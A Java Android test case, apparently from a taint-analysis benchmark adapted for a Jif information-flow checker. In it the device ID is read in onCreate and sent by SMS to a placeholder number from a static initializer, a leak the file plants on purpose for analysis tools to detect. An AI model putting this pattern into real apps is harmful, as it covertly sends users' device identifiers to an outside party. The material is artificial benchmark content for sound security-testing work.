package test;

import test.Activity;
import android.content.Context;
import android.os.Bundle;
import test.SmsManager;
import android.telephony.TelephonyManager;
import test.R;
import jif.runtime.Runtime;

/**
 * @testcase_name StaticInitialization1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description tainted data is leaked to a sink during static initialization of a class
 * @dataflow source -> im -> sink
 * @number_of_leaks 1
 * @challenges the analysis has to consider static initialization
 */
public class MainActivity extends Activity {

    public static String im;

    @Override
    protected void onCreate{}(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout);
        im = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
        StaticInitClass1 s1 = new StaticInitClass1();
    }

    public static class StaticInitClass1 {

        static {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage("+49 1234", null, im, null, null);
        }
    }
}
